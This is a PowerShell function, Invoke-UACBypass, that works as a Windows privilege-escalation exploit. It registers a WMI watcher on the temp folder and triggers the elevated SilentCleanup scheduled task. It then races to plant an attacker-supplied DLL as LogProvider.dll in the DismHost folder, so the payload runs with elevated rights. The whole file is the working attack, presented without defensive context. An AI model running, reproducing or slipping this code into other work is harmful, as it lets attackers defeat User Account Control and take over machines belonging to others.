function Invoke-UACBypass {


    [CmdletBinding()]
    [OutputType([System.IO.FileInfo])]
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateScript({ Test-Path $_ })]
        $DllPath
    )

    $PrivescAction = {
        $ReplacementDllPath = $Event.MessageData.DllPath
        
        $DismHostFolder = $EventArgs.NewEvent.TargetInstance.Name
        
        $OriginalPreference = $VerbosePreference

        
        if ($Event.MessageData.VerboseSet -eq $True) {
            $VerbosePreference = 'Continue'
        }

        Write-Verbose "DismHost folder created in $DismHostFolder"
        Write-Verbose "$ReplacementDllPath to $DismHostFolder\LogProvider.dll"
            
        try {
            $FileInfo = Copy-Item -Path $ReplacementDllPath -Destination "$DismHostFolder\LogProvider.dll" -Force -PassThru -ErrorAction Stop
        } catch {
            Write-Warning "Error copying file! Message: $_"
        }

        
        $VerbosePreference = $OriginalPreference

        if ($FileInfo) {
            
            New-Event -SourceIdentifier 'DllPlantedSuccess' -MessageData $FileInfo
        }
    }

    $VerboseSet = $False
    if ($PSBoundParameters['Verbose']) { $VerboseSet = $True }

    $MessageData = New-Object -TypeName PSObject -Property @{
        DllPath = $DllPath
        VerboseSet = $VerboseSet 
                                 
    }

    $TempDrive = $Env:TEMP.Substring(0,2)

    
    
    
    
    $TempFolderCreationEvent = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA `"Win32_Directory`" AND TargetInstance.Drive = `"$TempDrive`" AND TargetInstance.Path = `"$($Env:TEMP.Substring(2).Replace('\', '\\'))\\`" AND TargetInstance.FileName LIKE `"________-____-____-____-____________`""
    
    $TempFolderWatcher = Register-WmiEvent -Query $TempFolderCreationEvent -Action $PrivescAction -MessageData $MessageData

    
    $StartInfo = New-Object Diagnostics.ProcessStartInfo
    $StartInfo.FileName = 'schtasks'
    $StartInfo.Arguments = '/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I'
    $StartInfo.RedirectStandardError = $True
    $StartInfo.RedirectStandardOutput = $True
    $StartInfo.UseShellExecute = $False
    $Process = New-Object Diagnostics.Process
    $Process.StartInfo = $StartInfo
    $null = $Process.Start()
    $Process.WaitForExit()
    $Stdout = $Process.StandardOutput.ReadToEnd().Trim()
    $Stderr = $Process.StandardError.ReadToEnd().Trim()

    if ($Stderr) {
        Unregister-Event -SubscriptionId $TempFolderWatcher.Id
        throw "SilentCleanup task failed to execute. Error message: $Stderr"
    } else {
        if ($Stdout.Contains('is currently running')) {
            Unregister-Event -SubscriptionId $TempFolderWatcher.Id
            Write-Warning 'SilentCleanup task is already running. Please wait until the task has completed.'
        }

        Write-Verbose "SilentCleanup task executed successfully. Message: $Stdout"
    }

    $PayloadExecutedEvent = Wait-Event -SourceIdentifier 'DllPlantedSuccess' -Timeout 10

    Unregister-Event -SubscriptionId $TempFolderWatcher.Id

    if ($PayloadExecutedEvent) {
        Write-Verbose 'UAC bypass was successful!'

        
        $PayloadExecutedEvent.MessageData

        $PayloadExecutedEvent | Remove-Event
    } else {
        
        Write-Error 'UAC bypass failed. The DLL was not planted in its target.'
    }
}
